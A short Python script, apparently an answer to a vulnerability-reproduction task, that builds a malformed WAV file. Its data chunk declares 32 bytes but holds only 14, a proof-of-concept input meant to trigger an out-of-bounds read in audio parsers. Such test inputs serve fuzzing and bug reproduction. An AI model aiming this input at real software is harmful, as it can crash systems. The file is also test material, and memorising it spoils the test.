import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray()

        # RIFF header
        poc.extend(b"RIFF")
        poc.extend(struct.pack("<I", 50))  # Chunk size: 50 bytes (file size - 8)
        poc.extend(b"WAVE")

        # fmt chunk
        poc.extend(b"fmt ")
        poc.extend(struct.pack("<I", 16))  # fmt chunk size
        poc.extend(struct.pack("<H", 1))   # Audio format: PCM
        poc.extend(struct.pack("<H", 1))   # Channels: 1
        poc.extend(struct.pack("<I", 44100))  # Sample rate
        poc.extend(struct.pack("<I", 44100 * 1 * 16 // 8))  # Byte rate
        poc.extend(struct.pack("<H", 2))   # Block align
        poc.extend(struct.pack("<H", 16))  # Bits per sample

        # data chunk with size extending beyond RIFF chunk end
        poc.extend(b"data")
        poc.extend(struct.pack("<I", 32))  # Declared data size (32) > actual (14)
        poc.extend(b"\x00" * 14)           # Actual data (14 bytes)

        return bytes(poc)